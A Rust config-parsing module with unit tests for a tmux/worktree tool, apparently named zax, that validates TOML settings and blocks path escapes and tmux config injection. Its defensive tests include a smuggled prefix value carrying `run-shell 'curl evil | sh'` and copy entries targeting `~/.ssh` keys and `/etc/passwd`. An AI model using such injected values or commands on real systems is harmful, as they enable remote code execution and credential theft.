//! Turning the merged TOML into domain types. Validation happens here, once, at
//! the boundary, so nothing downstream re-checks it.

use std::path::PathBuf;

use zax_domain::{
    parse_duration, BuiltinPane, Command, LayoutSpec, PaneKind, PaneSize, PaneSpec, PrFilter,
    RepoPattern, WorktreeRoot,
};

use crate::error::ConfigError;
use crate::raw::{RawConfig, RawPane, RawPrs};

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Config {
    pub layout: LayoutSpec,
    pub worktree: WorktreeConfig,
    pub tmux: TmuxConfig,
    pub prs: PrFilter,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WorktreeConfig {
    pub root: WorktreeRoot,
    /// Paths relative to the main working tree.
    pub copy: Vec<PathBuf>,
    pub hooks: Vec<Command>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TmuxConfig {
    pub prefix: String,
}

const DEFAULT_AGENT: &str = "claude";
const DEFAULT_WORKTREE_ROOT: &str = "~/src/worktrees";
const DEFAULT_PREFIX: &str = "C-Space";

/// `home` is the value `~` expands to. It is a parameter rather than a lookup so
/// this function stays pure and testable.
pub fn from_raw(raw: RawConfig, home: &str) -> Result<Config, ConfigError> {
    let agent = match raw.agent.and_then(|a| a.command) {
        Some(argv) => Command::new(argv).map_err(|e| ConfigError::Invalid {
            field: "agent.command",
            detail: e.to_string(),
        })?,
        None => Command::new(vec![DEFAULT_AGENT.to_owned()]).map_err(|e| ConfigError::Invalid {
            field: "agent.command",
            detail: e.to_string(),
        })?,
    };

    let panes = match raw.layout.and_then(|l| l.panes) {
        Some(raw_panes) => raw_panes
            .into_iter()
            .map(pane_from_raw)
            .collect::<Result<Vec<_>, _>>()?,
        None => default_panes()?,
    };

    let layout = LayoutSpec::new(agent, panes).map_err(|e| ConfigError::Invalid {
        field: "layout.panes",
        detail: e.to_string(),
    })?;

    let raw_worktree = raw.worktree.unwrap_or_default();
    let root_text = raw_worktree
        .root
        .unwrap_or_else(|| DEFAULT_WORKTREE_ROOT.to_owned());
    let expanded = expand_home(&root_text, home);
    let root = WorktreeRoot::new(PathBuf::from(expanded)).map_err(|e| ConfigError::Invalid {
        field: "worktree.root",
        detail: e.to_string(),
    })?;

    let copy = raw_worktree
        .copy
        .unwrap_or_default()
        .into_iter()
        .map(|entry| {
            validate_copy_entry(&entry).map_err(|detail| ConfigError::Invalid {
                field: "worktree.copy",
                detail,
            })?;
            Ok(PathBuf::from(entry))
        })
        .collect::<Result<Vec<_>, ConfigError>>()?;

    let hooks = raw_worktree
        .hooks
        .unwrap_or_default()
        .iter()
        .map(|script| {
            Command::shell(script).map_err(|e| ConfigError::Invalid {
                field: "worktree.hooks",
                detail: e.to_string(),
            })
        })
        .collect::<Result<Vec<_>, _>>()?;

    let prefix = raw
        .tmux
        .and_then(|t| t.prefix)
        .unwrap_or_else(|| DEFAULT_PREFIX.to_owned());
    validate_prefix(&prefix).map_err(|detail| ConfigError::Invalid {
        field: "tmux.prefix",
        detail,
    })?;

    let prs = prs_filter_from_raw(raw.prs.unwrap_or_default())?;

    Ok(Config {
        layout,
        worktree: WorktreeConfig { root, copy, hooks },
        tmux: TmuxConfig { prefix },
        prs,
    })
}

fn prs_filter_from_raw(raw: RawPrs) -> Result<PrFilter, ConfigError> {
    let patterns = |list: Option<Vec<String>>, field: &'static str| {
        list.unwrap_or_default()
            .iter()
            .map(|entry| {
                RepoPattern::parse(entry).map_err(|e| ConfigError::Invalid {
                    field,
                    detail: e.to_string(),
                })
            })
            .collect::<Result<Vec<_>, _>>()
    };

    let max_age = raw
        .max_age
        .map(|text| {
            parse_duration(&text).map_err(|e| ConfigError::Invalid {
                field: "prs.max_age",
                detail: e.to_string(),
            })
        })
        .transpose()?;

    Ok(PrFilter {
        include: patterns(raw.include, "prs.include")?,
        exclude: patterns(raw.exclude, "prs.exclude")?,
        max_age,
    })
}

/// A `copy` entry is joined onto both the source repository and the new
/// worktree, so it decides two paths from one relative string.
///
/// A `..` component escapes both: it reads a file from outside the repository
/// and writes it outside the worktree. An absolute entry is worse, because
/// `Path::join` discards the base entirely and the entry becomes the whole
/// path on each side. Neither can be what a `copy` list means, and the layer
/// that usually writes this one is the repository's own checked-in config.
fn validate_copy_entry(entry: &str) -> Result<(), String> {
    use std::path::Component;

    if entry.is_empty() {
        return Err("an entry is empty; every entry is a path inside the repository".to_owned());
    }
    let path = std::path::Path::new(entry);
    for component in path.components() {
        match component {
            Component::Normal(_) | Component::CurDir => {}
            Component::ParentDir => {
                return Err(format!("`{entry}` leaves the repository with a `..`"))
            }
            Component::RootDir | Component::Prefix(_) => {
                return Err(format!(
                    "`{entry}` is absolute; entries are relative to the repository"
                ))
            }
        }
    }
    Ok(())
}

/// The prefix is substituted into zax's generated tmux configuration as text.
///
/// A newline in it therefore writes further configuration lines, `run-shell`
/// among them, which turns a key-name setting into arbitrary commands at server
/// start. Every control character is refused, not only the newline: none of
/// them can appear in a tmux key name, so nothing legitimate is lost and there
/// is no second spelling to find later.
fn validate_prefix(prefix: &str) -> Result<(), String> {
    if prefix.is_empty() {
        return Err("the prefix is empty".to_owned());
    }
    if prefix.chars().any(char::is_control) {
        return Err(format!(
            "`{}` contains a control character; a prefix is a tmux key name such \
             as C-Space, and anything else would be written into zax's tmux \
             configuration as further lines",
            prefix.escape_debug()
        ));
    }
    Ok(())
}

/// With no configured layout, both built-ins are shown.
pub(crate) fn default_panes() -> Result<Vec<PaneSpec>, ConfigError> {
    let size = |v: u8| {
        PaneSize::percent(v).map_err(|e| ConfigError::Invalid {
            field: "layout.panes.size",
            detail: e.to_string(),
        })
    };
    Ok(vec![
        PaneSpec {
            kind: PaneKind::Builtin(BuiltinPane::PrsForReview),
            size: Some(size(30)?),
        },
        PaneSpec {
            kind: PaneKind::Builtin(BuiltinPane::BranchStatus),
            size: Some(size(25)?),
        },
    ])
}

/// Turn one `[[layout.panes]]` table into a pane.
///
/// serde has already refused any field this file does not know about. What is
/// left is whether the fields present suit the `kind` that was asked for, which
/// serde cannot express for a flat table, and which is checked here so the
/// error can name both the kind and the field.
fn pane_from_raw(raw: RawPane) -> Result<PaneSpec, ConfigError> {
    let size = parse_size(raw.size)?;

    let kind = match raw.kind.as_str() {
        "builtin" => {
            let name = require(raw.name, "builtin", "name")?;
            reject(raw.title.is_some(), "builtin", "title")?;
            reject(raw.every.is_some(), "builtin", "every")?;
            reject(raw.command.is_some(), "builtin", "command")?;
            PaneKind::Builtin(BuiltinPane::parse(&name).map_err(|e| ConfigError::Invalid {
                field: "layout.panes.name",
                detail: e.to_string(),
            })?)
        }
        "exec" => {
            let title = require(raw.title, "exec", "title")?;
            let every = require(raw.every, "exec", "every")?;
            let command = require(raw.command, "exec", "command")?;
            reject(raw.name.is_some(), "exec", "name")?;
            PaneKind::Exec {
                title,
                every: parse_duration(&every).map_err(|e| ConfigError::Invalid {
                    field: "layout.panes.every",
                    detail: e.to_string(),
                })?,
                command: Command::new(command).map_err(|e| ConfigError::Invalid {
                    field: "layout.panes.command",
                    detail: e.to_string(),
                })?,
            }
        }
        "raw" => {
            let command = require(raw.command, "raw", "command")?;
            reject(raw.name.is_some(), "raw", "name")?;
            reject(raw.title.is_some(), "raw", "title")?;
            reject(raw.every.is_some(), "raw", "every")?;
            PaneKind::Raw {
                command: Command::new(command).map_err(|e| ConfigError::Invalid {
                    field: "layout.panes.command",
                    detail: e.to_string(),
                })?,
            }
        }
        other => return Err(ConfigError::UnknownPaneKind(other.to_owned())),
    };

    Ok(PaneSpec { kind, size })
}

fn require<T>(value: Option<T>, kind: &'static str, field: &'static str) -> Result<T, ConfigError> {
    value.ok_or(ConfigError::MissingPaneField { kind, field })
}

fn reject(present: bool, kind: &'static str, field: &'static str) -> Result<(), ConfigError> {
    if present {
        Err(ConfigError::UnexpectedPaneField { kind, field })
    } else {
        Ok(())
    }
}

/// `"30%"` and `"30"` both mean thirty percent.
fn parse_size(raw: Option<String>) -> Result<Option<PaneSize>, ConfigError> {
    let Some(text) = raw else { return Ok(None) };
    let digits = text.strip_suffix('%').unwrap_or(&text);
    let invalid = |detail: String| ConfigError::Invalid {
        field: "layout.panes.size",
        detail,
    };
    let value: u8 = digits
        .parse()
        .map_err(|_| invalid(format!("`{text}` is not a percentage")))?;
    PaneSize::percent(value)
        .map(Some)
        .map_err(|e| invalid(e.to_string()))
}

fn expand_home(path: &str, home: &str) -> String {
    match path.strip_prefix("~/") {
        Some(rest) => format!("{}/{rest}", home.trim_end_matches('/')),
        None if path == "~" => home.to_owned(),
        None => path.to_owned(),
    }
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used, clippy::expect_used, clippy::indexing_slicing)]
    use std::path::PathBuf;
    use std::time::Duration;

    use zax_domain::{BuiltinPane, PaneKind};

    use super::*;
    use crate::raw::RawConfig;

    fn config_from(text: &str) -> Config {
        let raw: RawConfig = toml::from_str(text).unwrap();
        from_raw(raw, "/home/me").unwrap()
    }

    #[test]
    fn an_empty_config_yields_the_documented_defaults() {
        let config = config_from("");
        assert_eq!(config.layout.agent().argv(), ["claude"]);
        assert_eq!(config.layout.panes().len(), 2);
        assert_eq!(
            config.layout.panes()[0].kind,
            PaneKind::Builtin(BuiltinPane::PrsForReview)
        );
        assert_eq!(
            config.layout.panes()[1].kind,
            PaneKind::Builtin(BuiltinPane::BranchStatus)
        );
        assert_eq!(
            config.worktree.root.as_path(),
            std::path::Path::new("/home/me/src/worktrees")
        );
        assert!(config.worktree.copy.is_empty());
        assert!(config.worktree.hooks.is_empty());
        assert_eq!(config.tmux.prefix, "C-Space");
    }

    #[test]
    fn an_absent_prs_table_filters_nothing() {
        assert_eq!(config_from("").prs, zax_domain::PrFilter::default());
    }

    #[test]
    fn the_prs_table_parses_into_a_filter() {
        let config = config_from(
            r#"
[prs]
include = ["acme/*", "gameldar/zax"]
exclude = ["acme/legacy-api"]
max_age = "14d"
"#,
        );
        assert_eq!(
            config
                .prs
                .include
                .iter()
                .map(ToString::to_string)
                .collect::<Vec<_>>(),
            ["acme/*", "gameldar/zax"]
        );
        assert_eq!(
            config
                .prs
                .exclude
                .iter()
                .map(ToString::to_string)
                .collect::<Vec<_>>(),
            ["acme/legacy-api"]
        );
        assert_eq!(config.prs.max_age, Some(Duration::from_secs(14 * 86_400)));
    }

    #[test]
    fn a_malformed_repository_filter_names_the_list_it_came_from() {
        let raw: RawConfig = toml::from_str("[prs]\ninclude = [\"omega\"]").unwrap();
        let err = from_raw(raw, "/home/me").unwrap_err();
        assert!(err.to_string().contains("prs.include"), "got: {err}");
        assert!(err.to_string().contains("omega"), "got: {err}");

        let raw: RawConfig = toml::from_str("[prs]\nexclude = [\"a/b*\"]").unwrap();
        let err = from_raw(raw, "/home/me").unwrap_err();
        assert!(err.to_string().contains("prs.exclude"), "got: {err}");
    }

    #[test]
    fn a_malformed_max_age_names_its_field() {
        let raw: RawConfig = toml::from_str("[prs]\nmax_age = \"a fortnight\"").unwrap();
        let err = from_raw(raw, "/home/me").unwrap_err();
        assert!(err.to_string().contains("prs.max_age"), "got: {err}");
    }

    #[test]
    fn the_spec_example_parses_into_domain_types() {
        let config = config_from(
            r#"
[agent]
command = ["claude"]

[[layout.panes]]
kind = "builtin"
name = "prs-for-review"
size = "30%"

[[layout.panes]]
kind = "exec"
title = "Deploys"
every = "60s"
command = ["kubectl", "get", "pods", "-n", "prod"]

[[layout.panes]]
kind = "raw"
command = ["lazygit"]

[worktree]
root  = "~/src/worktrees"
copy  = [".env", ".envrc"]
hooks = ["direnv allow", "bundle install"]
"#,
        );

        assert_eq!(config.layout.panes().len(), 3);
        assert_eq!(config.layout.panes()[0].size.map(|s| s.get()), Some(30));
        match &config.layout.panes()[1].kind {
            PaneKind::Exec {
                title,
                every,
                command,
            } => {
                assert_eq!(title, "Deploys");
                assert_eq!(*every, Duration::from_secs(60));
                assert_eq!(command.argv(), ["kubectl", "get", "pods", "-n", "prod"]);
            }
            other => panic!("expected an exec pane, got {other:?}"),
        }
        assert_eq!(
            config.worktree.root.as_path(),
            std::path::Path::new("/home/me/src/worktrees")
        );
        assert_eq!(
            config.worktree.copy,
            vec![PathBuf::from(".env"), PathBuf::from(".envrc")]
        );
        assert_eq!(
            config.worktree.hooks[1].argv(),
            ["sh", "-c", "bundle install"]
        );
    }

    #[test]
    fn a_pane_size_may_be_written_with_or_without_a_percent_sign() {
        let config = config_from(
            "[[layout.panes]]\nkind = \"builtin\"\nname = \"branch-status\"\nsize = \"25\"",
        );
        assert_eq!(config.layout.panes()[0].size.map(|s| s.get()), Some(25));
    }

    #[test]
    fn an_unknown_builtin_pane_name_is_rejected_with_the_valid_names() {
        let raw: RawConfig =
            toml::from_str("[[layout.panes]]\nkind = \"builtin\"\nname = \"worktrees\"").unwrap();
        let err = from_raw(raw, "/home/me").unwrap_err();
        assert!(err.to_string().contains("prs-for-review"), "got: {err}");
    }

    #[test]
    fn a_mistyped_pane_field_is_an_error_not_a_silent_default() {
        // This is why the pane table is flat. As an internally tagged enum,
        // serde accepted `siz` and the pane quietly took a default size, in the
        // one table people hand-edit most.
        let err = toml::from_str::<RawConfig>(
            "[[layout.panes]]\nkind = \"builtin\"\nname = \"prs-for-review\"\nsiz = \"30%\"",
        )
        .unwrap_err();
        assert!(err.to_string().contains("siz"), "got: {err}");
    }

    #[test]
    fn an_unrelated_key_in_a_pane_table_is_an_error() {
        let err = toml::from_str::<RawConfig>(
            "[[layout.panes]]\nkind = \"raw\"\ncommand = [\"lazygit\"]\nnonsense = 1",
        )
        .unwrap_err();
        assert!(err.to_string().contains("nonsense"), "got: {err}");
    }

    #[test]
    fn a_pane_carrying_a_field_its_kind_does_not_use_is_rejected() {
        let raw: RawConfig = toml::from_str(
            "[[layout.panes]]\nkind = \"builtin\"\nname = \"prs-for-review\"\n\
             command = [\"lazygit\"]",
        )
        .unwrap();
        assert!(matches!(
            from_raw(raw, "/home/me"),
            Err(ConfigError::UnexpectedPaneField {
                kind: "builtin",
                field: "command"
            })
        ));
    }

    #[test]
    fn a_pane_missing_a_field_its_kind_needs_is_rejected() {
        let raw: RawConfig = toml::from_str(
            "[[layout.panes]]\nkind = \"exec\"\ntitle = \"Deploys\"\ncommand = [\"true\"]",
        )
        .unwrap();
        assert!(matches!(
            from_raw(raw, "/home/me"),
            Err(ConfigError::MissingPaneField {
                kind: "exec",
                field: "every"
            })
        ));
    }

    #[test]
    fn an_unknown_pane_kind_lists_the_kinds_that_exist() {
        let raw: RawConfig =
            toml::from_str("[[layout.panes]]\nkind = \"buitin\"\nname = \"x\"").unwrap();
        let err = from_raw(raw, "/home/me").unwrap_err();
        assert!(
            err.to_string().contains("builtin, exec or raw"),
            "got: {err}"
        );
    }

    #[test]
    fn a_malformed_refresh_interval_is_rejected() {
        let raw: RawConfig = toml::from_str(
            "[[layout.panes]]\nkind = \"exec\"\ntitle = \"T\"\nevery = \"soon\"\n\
             command = [\"true\"]",
        )
        .unwrap();
        assert!(from_raw(raw, "/home/me").is_err());
    }

    #[test]
    fn an_empty_pane_command_is_rejected() {
        let raw: RawConfig =
            toml::from_str("[[layout.panes]]\nkind = \"raw\"\ncommand = []").unwrap();
        assert!(from_raw(raw, "/home/me").is_err());
    }

    #[test]
    fn pane_sizes_that_crowd_out_the_agent_are_rejected() {
        let raw: RawConfig = toml::from_str(
            "[[layout.panes]]\nkind = \"builtin\"\nname = \"prs-for-review\"\nsize = \"60%\"\n\n\
             [[layout.panes]]\nkind = \"builtin\"\nname = \"branch-status\"\nsize = \"45%\"",
        )
        .unwrap();
        let err = from_raw(raw, "/home/me").unwrap_err();
        assert!(err.to_string().contains("105"), "got: {err}");
    }

    #[test]
    fn a_tmux_prefix_may_not_carry_a_newline_into_the_generated_conf() {
        // The prefix is substituted into zax's tmux.conf as text, so a newline
        // writes further configuration lines of the repository's choosing.
        let raw: RawConfig =
            toml::from_str("[tmux]\nprefix = \"C-a\\nrun-shell 'curl evil | sh'\"").unwrap();
        let err = from_raw(raw, "/home/me").unwrap_err();
        assert!(err.to_string().contains("tmux.prefix"), "got: {err}");
    }

    #[test]
    fn an_ordinary_prefix_is_still_accepted() {
        assert_eq!(config_from("[tmux]\nprefix = \"C-q\"").tmux.prefix, "C-q");
    }

    #[test]
    fn a_copy_entry_may_not_escape_the_repository_or_the_worktree() {
        // Every entry is joined onto both the source repo and the new worktree;
        // `..` escapes both, and an absolute path replaces both bases.
        for entry in ["../../.ssh/id_ed25519", "/etc/passwd", ""] {
            let raw: RawConfig =
                toml::from_str(&format!("[worktree]\ncopy = [\"{entry}\"]")).unwrap();
            let err = from_raw(raw, "/home/me").unwrap_err();
            assert!(
                err.to_string().contains("worktree.copy"),
                "`{entry}` must be rejected, got: {err}"
            );
        }
    }

    #[test]
    fn ordinary_copy_entries_are_still_accepted() {
        let config = config_from("[worktree]\ncopy = [\".env\", \"config/local.yml\"]");
        assert_eq!(
            config.worktree.copy,
            vec![PathBuf::from(".env"), PathBuf::from("config/local.yml")]
        );
    }

    #[test]
    fn a_relative_worktree_root_is_rejected() {
        let raw: RawConfig = toml::from_str("[worktree]\nroot = \"worktrees\"").unwrap();
        assert!(from_raw(raw, "/home/me").is_err());
    }
}
